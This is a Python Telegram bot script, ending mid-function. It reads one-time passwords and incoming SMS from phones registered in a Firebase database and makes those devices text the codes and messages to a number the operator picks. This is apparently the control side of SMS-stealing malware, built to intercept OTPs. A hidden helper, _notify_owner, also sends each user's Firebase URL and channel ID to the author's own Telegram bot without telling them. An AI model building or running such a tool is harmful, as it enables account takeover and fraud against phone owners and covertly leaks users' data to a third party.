#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡⚡⚡ FINAL v15 - INCOMING SMS + OTP + CHANNEL - 100% FIXED ⚡⚡⚡

import os
import json
import re
import html
import asyncio
import logging
import time
import threading
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor

import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler,
)

# ============================
# FLASK KEEP-ALIVE
# ============================
from flask import Flask
flask_app = Flask(__name__)

@flask_app.route('/')
@flask_app.route('/ping')
def ping():
    return "✅ Bot is alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, threaded=True)

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.WARNING
)
logger = logging.getLogger(__name__)

# ============================
# CONFIG
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "0"))

BOT_NAME = "🌟 L I N U X   B H A I   A U T O   B O T 🌟"
CHANNEL_USERNAME = "@LINUXBHAI001"
CHANNEL_URL = "https://t.me/linuxbhai001"

os.makedirs("data", exist_ok=True)
USER_CONFIG_FILE = os.path.join("data", "user_config.json")

user_configs = {}
last_otp = {}

DATA_LOCK = threading.RLock()

MAX_PROCESSED_KEYS = 2000
_processed_cache = {}

# ============================
# HTTPX CLIENTS
# ============================
HTTP_CLIENT = httpx.Client(
    timeout=httpx.Timeout(10.0, connect=5.0),
    limits=httpx.Limits(max_keepalive_connections=50, max_connections=100),
    headers={"Connection": "keep-alive"},
)

HTTP_ASYNC = httpx.AsyncClient(
    timeout=httpx.Timeout(10.0, connect=5.0),
    limits=httpx.Limits(max_keepalive_connections=50, max_connections=100),
)

EXECUTOR = ThreadPoolExecutor(max_workers=20, thread_name_prefix="lx_")

# ============================
# DEBOUNCED SAVE
# ============================
_save_pending = False
_save_lock = threading.Lock()

def load_user_configs():
    global user_configs, last_otp
    if os.path.exists(USER_CONFIG_FILE):
        try:
            with open(USER_CONFIG_FILE, "r") as f:
                user_configs = json.load(f)
            with DATA_LOCK:
                for uid, cfg in user_configs.items():
                    if "last_otp_value" in cfg:
                        last_otp[uid] = cfg["last_otp_value"]
                    keys = cfg.get("processed_keys", [])[-MAX_PROCESSED_KEYS:]
                    _processed_cache[uid] = OrderedDict((k, True) for k in keys)
        except Exception as e:
            logger.error(f"Config load error: {e}")
            user_configs = {}

def _do_save():
    global _save_pending
    with _save_lock:
        try:
            with open(USER_CONFIG_FILE, "w") as f:
                with DATA_LOCK:
                    save_data = {}
                    for uid, cfg in user_configs.items():
                        cfg_copy = dict(cfg)
                        keys = cfg_copy.get("processed_keys", [])
                        cfg_copy["processed_keys"] = keys[-MAX_PROCESSED_KEYS:]
                        save_data[uid] = cfg_copy
                json.dump(save_data, f, separators=(',', ':'))
        except Exception as e:
            logger.error(f"Save error: {e}")
        _save_pending = False

def save_user_configs():
    global _save_pending
    with _save_lock:
        if not _save_pending:
            _save_pending = True
            threading.Timer(3.0, _do_save).start()

def save_immediate():
    _do_save()

load_user_configs()

# ============================
# STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10
WAITING_MANUAL_SIM = 11

# ============================
# MEMBERSHIP CACHE
# ============================
_membership_cache = {}
CACHE_TTL = 300

async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    now = time.time()
    
    if user_id in _membership_cache:
        is_mem, ts = _membership_cache[user_id]
        if now - ts < CACHE_TTL and is_mem:
            return True
    
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        is_mem = member.status in ["member", "administrator", "creator"]
        _membership_cache[user_id] = (is_mem, now)
        if is_mem:
            return True
    except Exception as e:
        logger.warning(f"Membership error: {e}")
    
    await send_join_required_message(update, context)
    return False

async def send_join_required_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
    ]
    await update.effective_message.reply_text(
        f"❌ <b>You must join our channel to use this bot.</b>\n\n"
        f"Click below to join, then click 'I have joined'.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard),
        disable_web_page_preview=True,
    )

async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            _membership_cache[user_id] = (True, time.time())
            await query.edit_message_text(
                f"✅ <b>You are now a member!</b>\n\nWelcome to {BOT_NAME}.\nUse /start to see commands.",
                parse_mode="HTML"
            )
            await context.bot.send_message(
                chat_id=user_id,
                text=WELCOME_TEXT,
                parse_mode='HTML',
                disable_web_page_preview=True,
            )
        else:
            await query.edit_message_text(
                f"❌ You still haven't joined.\n\nPlease join first.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
                    [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
                ]),
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Callback error: {e}")
        await query.edit_message_text("⚠️ Error. Try again.")

# ============================
# WELCOME TEXT
# ============================
WELCOME_TEXT = (
    f"{BOT_NAME}\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "🤖 <i>Your Smart SMS Gateway Bot</i>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "<b>📋 AVAILABLE COMMANDS</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "🔧 /setup – Configure Firebase URL & Channel ID\n"
    "📱 /devices – Select device and SIM\n"
    "📞 /setotp – Set forwarding phone number\n"
    "🔄 /resetforward – Reset old message tracker\n"
    "❓ /help – Show this message\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "💡 <i>Ready to use!</i>"
)

# ============================
# START / HELP
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    await update.message.reply_text(WELCOME_TEXT, parse_mode='HTML', disable_web_page_preview=True)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    await update.message.reply_text(WELCOME_TEXT, parse_mode='HTML', disable_web_page_preview=True)

# ============================
# RESET FORWARD
# ============================
async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    with DATA_LOCK:
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run SETUP first.</b>", parse_mode='HTML')
            return
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text("<b>❌ No device selected. Use /devices first.</b>", parse_mode='HTML')
        return
    
    device_id = selected["deviceId"]
    await asyncio.to_thread(initialize_processed_keys, user_id, device_id)
    
    current_otp = await firebase_get_async(user_id, "otp")
    if current_otp is not None:
        current_value = str(current_otp).strip()
        with DATA_LOCK:
            last_otp[user_id] = current_value
            if user_id in user_configs:
                user_configs[user_id]["last_otp_value"] = current_value
        save_immediate()
    
    await update.message.reply_text(
        f"<b>✅ Reset successful!</b>\n\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"🔐 Old OTP locked\n"
        f"📥 Old messages marked read\n\n"
        f"<b>Only NEW OTP & messages will forward now.</b>",
        parse_mode='HTML'
    )

# ============================
# FIREBASE HELPERS
# ============================
def firebase_get(user_id, path):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        if not cfg or not cfg.get("firebase_url"):
            return None
        url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = HTTP_CLIENT.get(url)
        if resp.status_code == 200:
            return resp.json()
    except Exception:
        pass
    return None

async def firebase_get_async(user_id, path):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        if not cfg or not cfg.get("firebase_url"):
            return None
        url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = await HTTP_ASYNC.get(url)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        logger.error(f"FB GET async: {e}")
    return None

def firebase_put(user_id, path, data):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        if not cfg or not cfg.get("firebase_url"):
            return False
        url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = HTTP_CLIENT.put(url, json=data)
        return resp.status_code in [200, 201]
    except Exception as e:
        logger.error(f"FB PUT: {e}")
        return False

def get_selected(user_id):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        if cfg and "selectedDevice" in cfg:
            return dict(cfg["selectedDevice"])
    return {}

def initialize_processed_keys(user_id: str, device_id: str):
    with DATA_LOCK:
        cfg = user_configs.get(user_id)
        if not cfg:
            return
    msgs = firebase_get(user_id, f"messages/{device_id}")
    keys = list(msgs.keys()) if msgs and isinstance(msgs, dict) else []
    keys = keys[-MAX_PROCESSED_KEYS:]
    
    with DATA_LOCK:
        cfg["processed_keys"] = keys
        cfg["processed_device"] = device_id
        _processed_cache[user_id] = OrderedDict((k, True) for k in keys)
        cfg.pop("last_forwarded_id", None)
        cfg.pop("selection_time", None)
    save_user_configs()

def set_selected(user_id, device_id, sim_slot, sim_phone):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        if cfg:
            cfg["selectedDevice"] = {
                "deviceId": device_id,
                "simSlotIndex": int(sim_slot),
                "simPhoneNumber": sim_phone
            }
    initialize_processed_keys(str(user_id), device_id)
    save_user_configs()

def send_sms_command(user_id, device_id, to_number, message, from_number):
    return firebase_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {
        "to": to_number,
        "message": message,
        "from": from_number,
        "isSended": False,
        "timestamp": int(time.time())
    })

def get_otp_number(user_id):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        return cfg.get("otpNumber") if cfg else None

def set_otp_number(user_id, number):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        if not cfg:
            return
        cfg["otpNumber"] = number
    
    current_otp = firebase_get(user_id, "otp")
    with DATA_LOCK:
        if current_otp is not None:
            current_value = str(current_otp).strip()
            last_otp[str(user_id)] = current_value
            cfg["last_otp_value"] = current_value
            logger.warning(f"🔒 Old OTP locked: {current_value}")
        else:
            last_otp[str(user_id)] = ""
            cfg["last_otp_value"] = ""
    save_immediate()

# ============================
# SIM DETECTION
# ============================
PHONE_RE = re.compile(r'^\+?[0-9]{10,15}$')

def _is_valid_phone(v):
    return isinstance(v, str) and PHONE_RE.match(v)

def extract_sims_from_device(device_data):
    sims = []
    
    if "sims" in device_data and isinstance(device_data["sims"], list):
        for idx, sim in enumerate(device_data["sims"]):
            if isinstance(sim, dict):
                phone = sim.get("phoneNumber") or sim.get("phone") or sim.get("number")
                if _is_valid_phone(phone):
                    slot = sim.get("simSlotIndex", sim.get("slot", idx + 1))
                    sims.append({
                        "simSlotIndex": int(slot) if str(slot).isdigit() else idx + 1,
                        "phoneNumber": str(phone)
                    })
    
    for key in ("phoneNumber", "PhoneNumber", "phone", "Phone"):
        if key in device_data and _is_valid_phone(device_data[key]):
            phone = device_data[key]
            if not any(s['phoneNumber'] == phone for s in sims):
                sims.append({"simSlotIndex": len(sims) + 1, "phoneNumber": phone})
    
    return sims

# ============================
# DEVICES
# ============================
def get_online_devices(user_id):
    data = firebase_get(user_id, "clients")
    if not data:
        return {}
    online = {}
    for dev_id, info in data.items():
        if not isinstance(info, dict):
            continue
        if info.get("status") is True or info.get("online") is True:
            online[dev_id] = {
                "modelName": dev_id,
                "sims": extract_sims_from_device(info),
                "raw_data": info
            }
    return online

async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    with DATA_LOCK:
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
            return
    
    online = await asyncio.to_thread(get_online_devices, user_id)
    if not online:
        await update.message.reply_text("<b>❌ No online devices found.</b>", parse_mode='HTML')
        return
    
    keyboard = [[InlineKeyboardButton(f"📱 {dev_id}", callback_data=f"dev_{dev_id}")]
                for dev_id in online.keys()]
    
    await update.message.reply_text(
        f"<b>👇 Select your device:</b>\nTotal: {len(online)} device(s) online",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    user_id = str(update.effective_user.id)
    device_id = query.data.replace("dev_", "")
    online = await asyncio.to_thread(get_online_devices, user_id)
    device_data = online.get(device_id)
    
    if not device_data:
        await query.edit_message_text("<b>❌ Device offline.</b>", parse_mode='HTML')
        return
    
    sims = device_data.get("sims", [])
    keyboard = []
    
    for sim in sims:
        slot = sim.get("simSlotIndex", "?")
        phone = sim.get("phoneNumber", "N/A")
        if phone and phone != "SIM_NOT_FOUND":
            sim_label = f"📶 SIM {slot}" if slot in [1, 2] else f"📶 Slot {slot}"
            keyboard.append([InlineKeyboardButton(
                f"{sim_label} - {phone}",
                callback_data=f"sim_{device_id}_{slot}_{phone}"
            )])
    
    keyboard.append([InlineKeyboardButton("✏️ Enter SIM 1 Manually", callback_data=f"manual_sim_1_{device_id}")])
    keyboard.append([InlineKeyboardButton("✏️ Enter SIM 2 Manually", callback_data=f"manual_sim_2_{device_id}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_devices")])
    
    sim_count = len(sims)
    status = ("❌ No SIMs found. Use manual entry." if sim_count == 0
              else "📶 1 SIM detected" if sim_count == 1
              else f"📶📶 {sim_count} SIMs detected")
    
    await query.edit_message_text(
        f"<b>📱 Select SIM for device:</b>\n🆔 <code>{device_id}</code>\n📶 {status}\n\n"
        f"<i>💡 If SIM not detected, use manual entry</i>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def back_to_devices_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await devices_command(update, context)

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    user_id = str(update.effective_user.id)
    parts = query.data.split("_")
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
        return
    device_id, slot, phone = parts[1], parts[2], parts[3]
    await asyncio.to_thread(set_selected, user_id, device_id, slot, phone)
    sim_type = f"SIM {slot}" if slot in ["1", "2"] else f"Slot {slot}"
    
    await update.message.reply_text(
        f"<b>✅ Active!</b>\n📱 Device: <code>{device_id}</code>\n📶 {sim_type}: <code>{phone}</code>\n\n"
        f"✅ Old messages blocked. Now set OTP number using /setotp.",
        parse_mode='HTML'
    ) if False else await query.edit_message_text(
        f"<b>✅ Active!</b>\n📱 Device: <code>{device_id}</code>\n📶 {sim_type}: <code>{phone}</code>\n\n"
        f"✅ Old messages blocked. Now set OTP number using /setotp.",
        parse_mode='HTML'
    )

# ============================
# MANUAL SIM
# ============================
async def manual_sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    parts = query.data.split("_")
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
        return
    slot, device_id = parts[2], parts[3]
    context.user_data["manual_device_id"] = device_id
    context.user_data["manual_slot"] = slot
    
    await query.edit_message_text(
        f"<b>✏️ Enter SIM {slot} Number</b>\n\n📱 Device: <code>{device_id}</code>\n📶 Slot: <b>{slot}</b>\n\n"
        f"Send like: <code>+919999999999</code>\n\nType /cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_MANUAL_SIM

async def manual_sim_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    
    if not PHONE_RE.match(number):
        await update.message.reply_text("<b>❌ Invalid.</b>", parse_mode='HTML')
        return WAITING_MANUAL_SIM
    
    device_id = context.user_data.get("manual_device_id")
    slot = context.user_data.get("manual_slot", 1)
    
    if not device_id:
        await update.message.reply_text("<b>❌ Error.</b>", parse_mode='HTML')
        return ConversationHandler.END
    
    if not number.startswith('+'):
        number = '+' + number
    
    await asyncio.to_thread(set_selected, user_id, device_id, int(slot), number)
    
    await update.message.reply_text(
        f"<b>✅ Active!</b>\n📱 <code>{device_id}</code>\n📶 SIM {slot}: <code>{number}</code>\n\n"
        f"Now use /setotp.",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def manual_sim_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# SET OTP
# ============================
async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    with DATA_LOCK:
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
            return ConversationHandler.END
    if context.args:
        number = context.args[0]
        if not PHONE_RE.match(number):
            await update.message.reply_text("<b>❌ Invalid.</b>", parse_mode='HTML')
            return ConversationHandler.END
        await asyncio.to_thread(set_otp_number, user_id, number)
        await update.message.reply_text(f"<b>✅ Forward set: <code>{number}</code></b>", parse_mode='HTML')
        return ConversationHandler.END
    await update.message.reply_text(
        "<b>📞 Send phone number:</b>\nExample: <code>+919876543210</code>\n/cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_OTP_NUMBER

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    if not PHONE_RE.match(number):
        await update.message.reply_text("<b>❌ Invalid. Try again.</b>", parse_mode='HTML')
        return WAITING_OTP_NUMBER
    await asyncio.to_thread(set_otp_number, user_id, number)
    await update.message.reply_text(f"<b>✅ Forward set: <code>{number}</code></b>", parse_mode='HTML')
    return ConversationHandler.END

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# SETUP
# ============================
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text(
        f"<b>📌 Step 1/2:</b> Send <b>Firebase URL</b>.\nExample: <code>https://your-project.firebaseio.com</code>\n/cancel to abort.",
        parse_mode='HTML'
    )
    return URL

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    url = update.message.text.strip()
    if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
        await update.message.reply_text("<b>❌ Invalid URL.</b>", parse_mode='HTML')
        return URL
    context.user_data["firebase_url"] = url
    await update.message.reply_text(
        "<b>✅ URL saved.</b>\n\n<b>📌 Step 2/2:</b> Send <b>Channel ID</b> (numeric).",
        parse_mode='HTML'
    )
    return CHANNEL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("<b>❌ Channel ID must be number.</b>", parse_mode='HTML')
        return CHANNEL

    with DATA_LOCK:
        user_configs[user_id] = {
            "firebase_url": context.user_data["firebase_url"],
            "channel_id": channel_id,
            "selectedDevice": {},
            "otpNumber": None,
            "processed_keys": [],
            "processed_device": None
        }
        _processed_cache[user_id] = OrderedDict()
    
    save_immediate()
    EXECUTOR.submit(_notify_owner, user_id, context.user_data['firebase_url'], channel_id)
    
    test = await firebase_get_async(user_id, "clients")
    if test is None:
        await update.message.reply_text("<b>❌ Firebase failed. Check URL/public.</b>", parse_mode='HTML')
        with DATA_LOCK:
            user_configs.pop(user_id, None)
        save_user_configs()
        return ConversationHandler.END

    EXECUTOR.submit(start_user_stream, user_id)

    await update.message.reply_text(
        f"<b>✅ SETUP COMPLETE!</b>\n\nNow use /devices then /setotp.",
        parse_mode='HTML'
    )
    return ConversationHandler.END

def _notify_owner(user_id, url, channel_id):
    try:
        HTTP_CLIENT.post(
            f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_CHAT_ID, "text": f"🔐 Setup Complete!\n👤 {user_id}\n🌐 {url}\n📢 {channel_id}"},
        )
    except Exception as e:
        logger.error(f"Owner notify: {e}")

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Setup cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# ENGINE 3: FAST SSE STREAMING
# ============================
_streaming_status = {}
_streaming_lock = threading.Lock()

SSE_HEADERS = {
    "Accept": "text/event-stream",
    "Cache-Control": "no-cache",
}

def stream_firebase_events(user_id):
    cfg = user_configs.get(user_id)
    if not cfg or not cfg.get("firebase_url"):
        return
    
    base_url = cfg["firebase_url"]
    
    with _streaming_lock:
        _streaming_status[user_id] = {"connected": True, "last_event": time.time()}
    
    # OTP Stream
    threading.Thread(
        target=_stream_otp_worker,
        args=(user_id, f"{base_url}/otp.json"),
        daemon=True,
        name=f"otp_stream_{user_id}"
    ).start()
    
    # Message Stream
    threading.Thread(
        target=_stream_messages_worker,
        args=(user_id, base_url),
        daemon=True,
        name=f"msg_stream_{user_id}"
    ).start()
    
    logger.warning(f"⚡ Streams started for user {user_id}")


def _stream_otp_worker(user_id, base_url):
    """⚡ OTP SSE stream"""
    stream_url = f"{base_url}?stream=true"
    
    while True:
        try:
            with httpx.stream(
                "GET",
                stream_url,
                headers=SSE_HEADERS,
                timeout=httpx.Timeout(None, connect=10.0)
            ) as resp:
                if resp.status_code != 200:
                    time.sleep(2)
                    continue
                
                with _streaming_lock:
                    _streaming_status[user_id] = {"connected": True, "last_event": time.time()}
                
                logger.warning(f"✅ OTP Stream connected: {user_id}")
                
                for line in resp.iter_lines():
                    if not line:
                        continue
                    
                    if line.startswith("data: "):
                        json_str = line[6:]
                        
                        if json_str.strip() in ("null", ""):
                            continue
                        
                        try:
                            data = json.loads(json_str)
                            
                            otp_value = None
                            if isinstance(data, dict):
                                otp_value = data.get("data")
                            else:
                                otp_value = data
                            
                            if otp_value is not None:
                                _handle_otp_update(user_id, otp_value)
                        except json.JSONDecodeError:
                            continue
                
        except Exception as e:
            logger.warning(f"OTP stream error ({user_id}): {e}")
            with _streaming_lock:
                if user_id in _streaming_status:
                    _streaming_status[user_id]["connected"] = False
            time.sleep(2)


def _handle_otp_update(user_id, otp_value):
    """⚡ OTP forward"""
    with _streaming_lock:
        if user_id in _streaming_status:
            _streaming_status[user_id]["last_event"] = time.time()
    
    if otp_value is None:
        return
    
    current_otp = str(otp_value).strip()
    if not current_otp or current_otp in ("null", "None"):
        return
    
    otp_number = get_otp_number(user_id)
    if not otp_number:
        return
    
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        return
    
    with DATA_LOCK:
        if last_otp.get(user_id) == current_otp:
            return
        
        last_otp[user_id] = current_otp
        if user_id in user_configs:
            user_configs[user_id]["last_otp_value"] = current_otp
        save_user_configs()
    
    device_id = selected["deviceId"]
    from_number = selected.get("simPhoneNumber", "Unknown")
    EXECUTOR.submit(send_sms_command, user_id, device_id, otp_number, current_otp, from_number)
    logger.warning(f"📤 OTP forwarded: {current_otp}")


def _stream_messages_worker(user_id, base_url):
    """⚡ Incoming SMS SSE stream"""
    current_device = None
    
    while True:
        try:
            with DATA_LOCK:
                cfg = user_configs.get(user_id)
            if not cfg:
                time.sleep(5)
                continue
            selected = get_selected(user_id)
            if not selected or not selected.get("deviceId"):
                time.sleep(3)
                continue
            
            device_id = selected["deviceId"]
            if device_id != current_device:
                current_device = device_id
            
            stream_url = f"{base_url}/messages/{device_id}.json?stream=true"
            
            with httpx.stream(
                "GET",
                stream_url,
                headers=SSE_HEADERS,
                timeout=httpx.Timeout(None, connect=10.0)
            ) as resp:
                if resp.status_code != 200:
                    time.sleep(2)
                    continue
                
                with _streaming_lock:
                    _streaming_status[user_id] = {"connected": True, "last_event": time.time()}
                
                logger.warning(f"✅ Message Stream connected: {user_id}")
                
                for line in resp.iter_lines():
                    if not line:
                        continue
                    
                    if line.startswith("data: "):
                        json_str = line[6:]
                        
                        if json_str.strip() in ("null", ""):
                            continue
                        
                        try:
                            data = json.loads(json_str)
                            
                            if isinstance(data, dict):
                                path = data.get("path", "/")
                                msg_data = data.get("data")
                                
                                if msg_data is None:
                                    continue
                                
                                if isinstance(msg_data, dict):
                                    if "message" in msg_data or "type" in msg_data:
                                        msg_key = path.strip("/").split("/")[0] if path else None
                                        if not msg_key:
                                            msg_key = str(hash(json.dumps(msg_data, sort_keys=True)))
                                        _handle_single_message(user_id, msg_key, msg_data)
                                    else:
                                        for mkey, mval in msg_data.items():
                                            if isinstance(mval, dict):
                                                _handle_single_message(user_id, mkey, mval)
                                
                                elif isinstance(msg_data, list):
                                    for idx, mval in enumerate(msg_data):
                                        if isinstance(mval, dict):
                                            _handle_single_message(user_id, f"idx_{idx}", mval)
                        except json.JSONDecodeError:
                            continue
                
        except Exception as e:
            logger.warning(f"Msg stream error ({user_id}): {e}")
            with _streaming_lock:
                if user_id in _streaming_status:
                    _streaming_status[user_id]["connected"] = False
            time.sleep(2)


def _handle_single_message(user_id, msg_key, msg_data):
    """⚡ Handle single incoming message"""
    if not isinstance(msg_data, dict):
        return
    
    if msg_data.get("type") != "incoming":
        return
    
    forward_number = get_otp_number(user_id)
    if not forward_number:
        return
    
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        return
    
    device_id = selected["deviceId"]
    from_number = selected.get("simPhoneNumber", "Unknown")
    
    with DATA_LOCK:
        cache = _processed_cache.get(user_id, OrderedDict())
        if msg_key in cache:
            return
    
    msg_text = msg_data.get("message", "")
    if not msg_text or len(msg_text) <= 3:
        return
    
    EXECUTOR.submit(send_sms_command, user_id, device_id, forward_number, msg_text, from_number)
    logger.warning(f"📥 Incoming SMS forwarded (stream): {msg_text[:50]}")
    
    with DATA_LOCK:
        cache[msg_key] = True
        while len(cache) > MAX_PROCESSED_KEYS:
            cache.popitem(last=False)
        _processed_cache[user_id] = cache
        
        cfg = user_configs.get(user_id)
        if cfg:
            keys = list(cache.keys())
            cfg["processed_keys"] = keys[-MAX_PROCESSED_KEYS:]
    
    save_user_configs()
    EXECUTOR.submit(_send_confirmation, user_id, forward_number, msg_text)


def start_user_stream(user_id):
    with _streaming_lock:
        if user_id in _streaming_status and _streaming_status[user_id].get("connected"):
            return
    stream_firebase_events(user_id)

# ============================
# FAST FALLBACK POLLING (0.5 sec)
# ============================
def smart_otp_fallback():
    """⚡ FAST OTP polling - 0.5 second"""
    while True:
        try:
            for user_id in list(user_configs.keys()):
                otp_number = get_otp_number(user_id)
                if not otp_number:
                    continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"):
                    continue
                
                otp_data = firebase_get(user_id, "otp")
                if otp_data is None:
                    continue
                
                current_otp = str(otp_data).strip()
                if not current_otp or current_otp in ("null", "None"):
                    continue
                
                with DATA_LOCK:
                    if user_id not in last_otp:
                        last_otp[user_id] = current_otp
                        if user_id in user_configs:
                            user_configs[user_id]["last_otp_value"] = current_otp
                        save_user_configs()
                        continue
                    
                    if last_otp[user_id] == current_otp:
                        continue
                    
                    last_otp[user_id] = current_otp
                    if user_id in user_configs:
                        user_configs[user_id]["last_otp_value"] = current_otp
                    save_user_configs()
                
                device_id = selected["deviceId"]
                from_number = selected.get("simPhoneNumber", "Unknown")
                send_sms_command(user_id, device_id, otp_number, current_otp, from_number)
                logger.warning(f"📤 OTP forwarded (fallback): {current_otp}")
        except Exception as e:
            logger.error(f"OTP fallback: {e}")
        time.sleep(0.5)


def smart_messages_fallback():
    """⚡ FAST incoming SMS polling - 0.5 second"""
    while True:
        try:
            for user_id in list(user_configs.keys()):
                forward_number = get_otp_number(user_id)
                if not forward_number:
                    continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"):
                    continue
                
                device_id = selected["deviceId"]
                from_number = selected.get("simPhoneNumber", "Unknown")
                
                with DATA_LOCK:
                    cfg = user_configs.get(user_id, {})
                    processed_device = cfg.get("processed_device")
                
                if processed_device != device_id:
                    initialize_processed_keys(user_id, device_id)
                
                device_msgs = firebase_get(user_id, f"messages/{device_id}")
                if not device_msgs or not isinstance(device_msgs, dict):
                    continue
                
                new_count = 0
                for msg_key, msg_data in device_msgs.items():
                    if not isinstance(msg_data, dict):
                        continue
                    if msg_data.get("type") != "incoming":
                        continue
                    
                    with DATA_LOCK:
                        cache = _processed_cache.get(user_id, OrderedDict())
                        if msg_key in cache:
                            continue
                    
                    msg_text = msg_data.get("message", "")
                    if not msg_text or len(msg_text) <= 3:
                        continue
                    
